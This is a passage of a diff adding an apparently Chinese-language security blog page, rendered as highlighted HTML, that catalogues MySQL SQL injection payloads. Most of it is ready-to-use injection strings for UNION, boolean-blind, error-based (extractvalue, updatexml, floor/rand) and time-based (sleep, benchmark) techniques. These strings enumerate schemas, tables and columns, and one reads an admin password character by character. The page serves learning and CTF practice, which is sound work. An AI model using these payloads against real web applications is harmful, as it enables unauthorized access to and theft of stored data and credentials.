+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">4
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">5
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">select</span> <span style="color:#fff;font-weight:bold">database</span>()
+</span></span><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">select</span> <span style="color:#fff;font-weight:bold">schema_name</span> <span style="color:#fff;font-weight:bold">from</span> information_schema.schemata;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#007f7f">-- MySQL8新特性(&gt;8.0.21)
+</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span><span style="color:#fff;font-weight:bold">table</span> information_schema.TABLESPACES_EXTENSIONS
+</span></span></code></pre></td></tr></table>
+</div>
+</div></li>
+<li>
+<p>根据上面得到的数据库进行爆对应的表:</p>
+<div class="highlight"><div style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">union</span> <span style="color:#fff;font-weight:bold">select</span> <span style="color:#ff0;font-weight:bold">1</span>,<span style="color:#ff0;font-weight:bold">2</span>,group_concat(<span style="color:#fff;font-weight:bold">table_name</span>),<span style="color:#ff0;font-weight:bold">4</span>,xxxx <span style="color:#fff;font-weight:bold">from</span> information_schema.tables <span style="color:#fff;font-weight:bold">where</span> table_schema=<span style="color:#fff;font-weight:bold">database</span>()
+</span></span></code></pre></td></tr></table>
+</div>
+</div><ul>
+<li>
+<p>union查询:</p>
+<div class="highlight"><div style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">3
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">4
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">5
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">UNION</span> <span style="color:#fff;font-weight:bold">SELECT</span> <span style="color:#fff;font-weight:bold">TABLE_NAME</span> <span style="color:#fff;font-weight:bold">FROM</span> information_schema.tables <span style="color:#fff;font-weight:bold">WHERE</span> TABLE_SCHEMA=<span style="color:#fff;font-weight:bold">database</span>();   <span style="color:#007f7f">/* 列出所有用户自定义数据库中的表 */</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#007f7f">-- MySQL 4版本时用version=9，MySQL 5版本时用version=10
+</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span><span style="color:#fff;font-weight:bold">UNION</span> <span style="color:#fff;font-weight:bold">SELECT</span> GROUP_CONCAT(<span style="color:#fff;font-weight:bold">table_name</span>) <span style="color:#fff;font-weight:bold">FROM</span> information_schema.tables <span style="color:#fff;font-weight:bold">WHERE</span> <span style="color:#fff;font-weight:bold">version</span>=<span style="color:#ff0;font-weight:bold">10</span>;   <span style="color:#007f7f">/* 列出当前数据库中的表 */</span>
+</span></span><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">SELECT</span> table_schema, <span style="color:#fff;font-weight:bold">table_name</span> <span style="color:#fff;font-weight:bold">FROM</span> information_schema.tables <span style="color:#fff;font-weight:bold">WHERE</span> table_schema!=<span style="color:#0ff;font-weight:bold">&#39;information_schema&#39;</span> <span style="color:#fff;font-weight:bold">AND</span> table_schema!=<span style="color:#0ff;font-weight:bold">&#39;mysql&#39;</span>;
+</span></span></code></pre></td></tr></table>
+</div>
+</div></li>
+<li>
+<p>盲注:</p>
+<div class="highlight"><div style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">3
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">4
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">AND</span> <span style="color:#fff;font-weight:bold">SELECT</span> SUBSTR(<span style="color:#fff;font-weight:bold">table_name</span>,<span style="color:#ff0;font-weight:bold">1</span>,<span style="color:#ff0;font-weight:bold">1</span>) <span style="color:#fff;font-weight:bold">FROM</span> information_schema.tables &gt; <span style="color:#0ff;font-weight:bold">&#39;A&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#007f7f">-- MySQL8新特性
+</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span><span style="color:#fff;font-weight:bold">and</span> (<span style="color:#fff;font-weight:bold">table</span> information_schema.TABLESPACES_EXTENSIONS <span style="color:#fff;font-weight:bold">limit</span> <span style="color:#ff0;font-weight:bold">1</span>,<span style="color:#ff0;font-weight:bold">1</span>)&gt;(<span style="color:#fff;font-weight:bold">BINARY</span>(<span style="color:#0ff;font-weight:bold">&#39;a&#39;</span>),<span style="color:#0ff;font-weight:bold">&#39;0&#39;</span>)#
+</span></span></code></pre></td></tr></table>
+</div>
+</div><ul>
+<li>主要是通过布尔盲注，一个个试，比较废时间,可以通过编写脚本</li>
+<li>时间盲注，根据时间判断成功与否也可以</li>
+</ul>
+</li>
+<li>
+<p>报错：</p>
+<div class="highlight"><div style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">AND</span>(<span style="color:#fff;font-weight:bold">SELECT</span> <span style="color:#fff;font-weight:bold">COUNT</span>(*) <span style="color:#fff;font-weight:bold">FROM</span> (<span style="color:#fff;font-weight:bold">SELECT</span> <span style="color:#ff0;font-weight:bold">1</span> <span style="color:#fff;font-weight:bold">UNION</span> <span style="color:#fff;font-weight:bold">SELECT</span> <span style="color:#fff;font-weight:bold">null</span> <span style="color:#fff;font-weight:bold">UNION</span> <span style="color:#fff;font-weight:bold">SELECT</span> !<span style="color:#ff0;font-weight:bold">1</span>)x <span style="color:#fff;font-weight:bold">GROUP</span> <span style="color:#fff;font-weight:bold">BY</span> CONCAT((<span style="color:#fff;font-weight:bold">SELECT</span> <span style="color:#fff;font-weight:bold">table_name</span> <span style="color:#fff;font-weight:bold">FROM</span> information_schema.tables <span style="color:#fff;font-weight:bold">LIMIT</span> <span style="color:#ff0;font-weight:bold">1</span>),FLOOR(RAND(<span style="color:#ff0;font-weight:bold">0</span>)*<span style="color:#ff0;font-weight:bold">2</span>))) (@:=<span style="color:#ff0;font-weight:bold">1</span>)||@ <span style="color:#fff;font-weight:bold">GROUP</span> <span style="color:#fff;font-weight:bold">BY</span> CONCAT((<span style="color:#fff;font-weight:bold">SELECT</span> <span style="color:#fff;font-weight:bold">table_name</span> <span style="color:#fff;font-weight:bold">FROM</span> information_schema.tables <span style="color:#fff;font-weight:bold">LIMIT</span> <span style="color:#ff0;font-weight:bold">1</span>),!@) <span style="color:#fff;font-weight:bold">HAVING</span> @||<span style="color:#fff;font-weight:bold">MIN</span>(@:=<span style="color:#ff0;font-weight:bold">0</span>); <span style="color:#fff;font-weight:bold">AND</span> ExtractValue(<span style="color:#ff0;font-weight:bold">1</span>, CONCAT(<span style="color:#ff0;font-weight:bold">0</span>x5c, (<span style="color:#fff;font-weight:bold">SELECT</span> <span style="color:#fff;font-weight:bold">table_name</span> <span style="color:#fff;font-weight:bold">FROM</span> information_schema.tables <span style="color:#fff;font-weight:bold">LIMIT</span> <span style="color:#ff0;font-weight:bold">1</span>)));
+</span></span><span style="display:flex;"><span><span style="color:#007f7f">-- 在5.1.5版本中成功。
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><ul>
+<li>主要是利用floor函数的溢出问题，</li>
+<li>通过contractxml函数等进行报错也可以实现<code>contract(0x7e,database())</code></li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p>根据对应的表获取对应的列名：</p>
+<div class="highlight"><div style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">Union</span> <span style="color:#fff;font-weight:bold">select</span> <span style="color:#ff0;font-weight:bold">1</span>,<span style="color:#ff0;font-weight:bold">2</span>,group_concat(<span style="color:#fff;font-weight:bold">column_name</span>),<span style="color:#ff0;font-weight:bold">4</span>,xxxx <span style="color:#fff;font-weight:bold">from</span> information_schema.columns <span style="color:#fff;font-weight:bold">where</span> table_schema=<span style="color:#fff;font-weight:bold">database</span>() <span style="color:#fff;font-weight:bold">and</span> <span style="color:#fff;font-weight:bold">table_name</span>=(<span style="color:#fff;font-weight:bold">table_name</span>) <span style="color:#007f7f">/*此处的表名为字符串型，也通过十六进制表示*/</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><ul>
+<li>
+<p>union查询</p>
+<div class="highlight"><div style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">UNION</span> <span style="color:#fff;font-weight:bold">SELECT</span> GROUP_CONCAT(<span style="color:#fff;font-weight:bold">column_name</span>) <span style="color:#fff;font-weight:bold">FROM</span> information_schema.columns <span style="color:#fff;font-weight:bold">WHERE</span> <span style="color:#fff;font-weight:bold">table_name</span> = <span style="color:#0ff;font-weight:bold">&#39;tablename&#39;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div></li>
+<li>
+<p>盲注</p>
+<div class="highlight"><div style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">AND</span> <span style="color:#fff;font-weight:bold">SELECT</span> SUBSTR(<span style="color:#fff;font-weight:bold">column_name</span>,<span style="color:#ff0;font-weight:bold">1</span>,<span style="color:#ff0;font-weight:bold">1</span>) <span style="color:#fff;font-weight:bold">FROM</span> information_schema.columns &gt; <span style="color:#0ff;font-weight:bold">&#39;A&#39;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div></li>
+<li>
+<p>报错</p>
+<div class="highlight"><div style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">3
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">4
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#007f7f">-- 在5.1.5版本中成功
+</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span><span style="color:#fff;font-weight:bold">AND</span> (<span style="color:#ff0;font-weight:bold">1</span>,<span style="color:#ff0;font-weight:bold">2</span>,<span style="color:#ff0;font-weight:bold">3</span>) = (<span style="color:#fff;font-weight:bold">SELECT</span> * <span style="color:#fff;font-weight:bold">FROM</span> SOME_EXISTING_TABLE <span style="color:#fff;font-weight:bold">UNION</span> <span style="color:#fff;font-weight:bold">SELECT</span> <span style="color:#ff0;font-weight:bold">1</span>,<span style="color:#ff0;font-weight:bold">2</span>,<span style="color:#ff0;font-weight:bold">3</span> <span style="color:#fff;font-weight:bold">LIMIT</span> <span style="color:#ff0;font-weight:bold">1</span>)
+</span></span><span style="display:flex;"><span><span style="color:#007f7f">-- MySQL 5.1版本修复了
+</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span><span style="color:#fff;font-weight:bold">AND</span>(<span style="color:#fff;font-weight:bold">SELECT</span> <span style="color:#fff;font-weight:bold">COUNT</span>(*) <span style="color:#fff;font-weight:bold">FROM</span> (<span style="color:#fff;font-weight:bold">SELECT</span> <span style="color:#ff0;font-weight:bold">1</span> <span style="color:#fff;font-weight:bold">UNION</span> SELE
+</span></span></code></pre></td></tr></table>
+</div>
+</div></li>
+</ul>
+</li>
+<li>
+<p>值查询</p>
+<div class="highlight"><div style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">3
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">4
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">Union</span> <span style="color:#fff;font-weight:bold">select</span> <span style="color:#ff0;font-weight:bold">1</span>,<span style="color:#ff0;font-weight:bold">2</span>,<span style="color:#fff;font-weight:bold">column_name</span>,<span style="color:#ff0;font-weight:bold">4</span>,xxx <span style="color:#fff;font-weight:bold">from</span> (database_name.)<span style="color:#fff;font-weight:bold">table_name</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#007f7f">-- MySQL8新特性
+</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span><span style="color:#fff;font-weight:bold">and</span> (<span style="color:#fff;font-weight:bold">table</span> flag <span style="color:#fff;font-weight:bold">limit</span> <span style="color:#ff0;font-weight:bold">1</span>,<span style="color:#ff0;font-weight:bold">1</span>)&gt;(<span style="color:#fff;font-weight:bold">BINARY</span>(<span style="color:#0ff;font-weight:bold">&#39;a&#39;</span>))#
+</span></span></code></pre></td></tr></table>
+</div>
+</div></li>
+</ul>
+<h2 id="盲注">盲注<a hidden class="anchor" aria-hidden="true" href="#盲注">#</a></h2>
+<h3 id="基于报错盲注">基于报错盲注<a hidden class="anchor" aria-hidden="true" href="#基于报错盲注">#</a></h3>
+<p>通过<strong>特殊函数</strong>的错误使用使其参数被页面输出。</p>
+<p>前提：服务器开启报错信息返回，也就是发生错误时返回报错信息。</p>
+<ul>
+<li>比如(<code>sqli.error()</code>)</li>
+</ul>
+<p>常见的利用函数有：<code>exp()、floor()+rand()、updatexml()、extractvalue()</code>等。</p>
+<div class="highlight"><div style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">3
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">4
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">5
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">6
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span>(<span style="color:#fff;font-weight:bold">where</span>|<span style="color:#fff;font-weight:bold">and</span>|<span style="color:#fff;font-weight:bold">or</span>) exp(~(<span style="color:#fff;font-weight:bold">select</span> * <span style="color:#fff;font-weight:bold">from</span>(<span style="color:#fff;font-weight:bold">select</span> <span style="color:#fff;font-weight:bold">user</span>())a));
+</span></span><span style="display:flex;"><span>(<span style="color:#fff;font-weight:bold">where</span>|<span style="color:#fff;font-weight:bold">and</span>|<span style="color:#fff;font-weight:bold">or</span>) pow(~(<span style="color:#fff;font-weight:bold">select</span> * <span style="color:#fff;font-weight:bold">from</span>(<span style="color:#fff;font-weight:bold">select</span> <span style="color:#fff;font-weight:bold">user</span>())a),<span style="color:#ff0;font-weight:bold">9999</span>);
+</span></span><span style="display:flex;"><span>(<span style="color:#fff;font-weight:bold">where</span>|<span style="color:#fff;font-weight:bold">and</span>|<span style="color:#fff;font-weight:bold">or</span>) updatexml(<span style="color:#ff0;font-weight:bold">1</span>,concat(<span style="color:#ff0;font-weight:bold">0</span>x7e,(<span style="color:#fff;font-weight:bold">select</span> <span style="color:#fff;font-weight:bold">user</span>()),<span style="color:#ff0;font-weight:bold">0</span>x7e),<span style="color:#ff0;font-weight:bold">1</span>);
+</span></span><span style="display:flex;"><span>(<span style="color:#fff;font-weight:bold">where</span>|<span style="color:#fff;font-weight:bold">and</span>|<span style="color:#fff;font-weight:bold">or</span>) extractvalue(<span style="color:#ff0;font-weight:bold">1</span>,concat(<span style="color:#ff0;font-weight:bold">0</span>x7e,(<span style="color:#fff;font-weight:bold">select</span> <span style="color:#fff;font-weight:bold">user</span>()),<span style="color:#ff0;font-weight:bold">0</span>x7e));
+</span></span><span style="display:flex;"><span>(<span style="color:#fff;font-weight:bold">where</span>|<span style="color:#fff;font-weight:bold">and</span>|<span style="color:#fff;font-weight:bold">or</span>) (<span style="color:#fff;font-weight:bold">select</span> <span style="color:#fff;font-weight:bold">count</span>(*) <span style="color:#fff;font-weight:bold">from</span> information_schema.tables <span style="color:#fff;font-weight:bold">group</span> <span style="color:#fff;font-weight:bold">by</span> concat((<span style="color:#fff;font-weight:bold">select</span> <span style="color:#fff;font-weight:bold">user</span>()),<span style="color:#ff0;font-weight:bold">0</span>x7e,floor(rand(<span style="color:#ff0;font-weight:bold">0</span>)*<span style="color:#ff0;font-weight:bold">2</span>)));
+</span></span><span style="display:flex;"><span>(<span style="color:#fff;font-weight:bold">where</span>|<span style="color:#fff;font-weight:bold">and</span>|<span style="color:#fff;font-weight:bold">or</span>) (<span style="color:#fff;font-weight:bold">select</span> <span style="color:#fff;font-weight:bold">count</span>(*) <span style="color:#fff;font-weight:bold">from</span> information_schema.tables <span style="color:#fff;font-weight:bold">group</span> <span style="color:#fff;font-weight:bold">by</span> concat((<span style="color:#fff;font-weight:bold">select</span> <span style="color:#fff;font-weight:bold">user</span>()),<span style="color:#ff0;font-weight:bold">0</span>x7e,ceil(rand(<span style="color:#ff0;font-weight:bold">0</span>)*<span style="color:#ff0;font-weight:bold">2</span>)));
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="基于时间盲注">基于时间盲注<a hidden class="anchor" aria-hidden="true" href="#基于时间盲注">#</a></h3>
+<p>依赖于通过<strong>页面返回的延迟时间</strong>来判断条件是否正确。</p>
+<p>通常可利用的产生时间延迟的函数有：<strong>sleep()、benchmark()</strong>，还有许多进行<strong>复杂运算的函数</strong>也可以当做延迟的判断标准、笛卡尔积合并数据表、GET_LOCK双SESSION产生延迟等方法。</p>
+<div class="highlight"><div style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 1
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 2
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 3
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 4
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 5
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 6
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 7
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 8
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 9
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">10
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">11
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">12
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">13
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">14
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">15
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">16
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">17
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#007f7f">-- sleep()
+</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span>(<span style="color:#fff;font-weight:bold">where</span> | <span style="color:#fff;font-weight:bold">and</span>) <span style="color:#fff;font-weight:bold">if</span>(substr((<span style="color:#fff;font-weight:bold">select</span> password <span style="color:#fff;font-weight:bold">from</span> users <span style="color:#fff;font-weight:bold">where</span> username=<span style="color:#0ff;font-weight:bold">&#39;admin&#39;</span>),<span style="color:#ff0;font-weight:bold">1</span>,<span style="color:#ff0;font-weight:bold">1</span>)=<span style="color:#0ff;font-weight:bold">&#39;a&#39;</span>,sleep(<span style="color:#ff0;font-weight:bold">3</span>),<span style="color:#ff0;font-weight:bold">1</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">select</span> * <span style="color:#fff;font-weight:bold">from</span> users <span style="color:#fff;font-weight:bold">where</span> username=<span style="color:#f00">$</span>username (<span style="color:#fff;font-weight:bold">and</span> | <span style="color:#fff;font-weight:bold">or</span>) <span style="color:#fff;font-weight:bold">if</span>(<span style="color:#fff;font-weight:bold">length</span>(<span style="color:#fff;font-weight:bold">database</span>())&gt;<span style="color:#ff0;font-weight:bold">8</span>,sleep(<span style="color:#ff0;font-weight:bold">3</span>),<span style="color:#ff0;font-weight:bold">1</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#007f7f">-- benchmark()
+</span></span></span><span style="display:flex;"><span><span style="color:#007f7f"></span><span style="color:#fff;font-weight:bold">or</span> benchmark(<span style="color:#ff0;font-weight:bold">5000000</span>,md5(<span style="color:#0ff;font-weight:bold">&#39;test&#39;</span>))
+</span></span><span style="display:flex;"><span><span style="color:#fff;font-weight:bold">or</span> <span style="color:#fff;font-weight:bold">if</span>(<span style="color:#fff;font-weight:bold">length</span>(<span style="color:#fff;font-weight:bold">database</span>())&gt;<span style="color:#ff0;font-weight:bold">5</span>,benchmark(<span style="color:#ff0;font-weight:bold">1500000</span>,md5(<span style="color:#0ff;font-weight:bold">&#39;test&#39;</span>)),<span style="color:#ff0;font-weight:bold">1</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#007f7f">-- pg_sleep()
